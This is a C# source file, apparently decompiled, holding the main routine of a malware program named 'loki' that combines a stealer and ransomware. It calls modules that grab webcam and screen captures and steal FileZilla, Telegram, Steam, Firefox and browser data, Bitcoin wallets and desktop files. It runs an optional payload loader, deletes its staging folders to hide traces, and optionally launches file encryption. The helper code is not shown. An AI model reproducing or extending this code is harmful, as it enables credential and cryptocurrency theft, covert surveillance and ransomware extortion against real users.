using System;
using System.IO;
using Loki.Utilities;
using loki.loki;
using loki.loki.Ransomware;
using loki.loki.Stealer;
using loki.loki.Utilies;
using loki.loki.Utilies.App;
using loki.loki.Utilies.Hardware;
using loki.loki.Utilies.Wallets;

namespace loki;

internal static class Program
{
	public static string dir = Path.GetTempPath() + "\\AX754VD.tmp";

	private static void Main()
	{
		Directory.CreateDirectory(dir);
		HomeDirectory.Create(GetDirPath.User_Name, Recursive: true);
		if (Settings.webka)
		{
			GetWebCam.get_webcam(dir);
		}
		screen.get_scr(dir);
		FileZilla.get_filezilla(dir);
		Telegram.StealTelegram(dir);
		if (Settings.steam)
		{
			Steam.StealSteam(dir);
		}
		if (Settings.loader)
		{
			loader.load();
		}
		if (Settings.grabber)
		{
			grabber.grab_desktop(dir);
		}
		mozila.mozila_still();
		Wallets.BitcoinSteal(dir);
		UserAgent.get_agent(dir);
		try
		{
			Browser_Parse.parse(dir);
		}
		catch (Exception)
		{
		}
		Hardware.info(dir);
		Directory.Delete(dir, recursive: true);
		Directory.Delete(GetDirPath.User_Name, recursive: true);
		if (Settings.ransomware)
		{
			RansomwareCrypt.start();
		}
	}
}
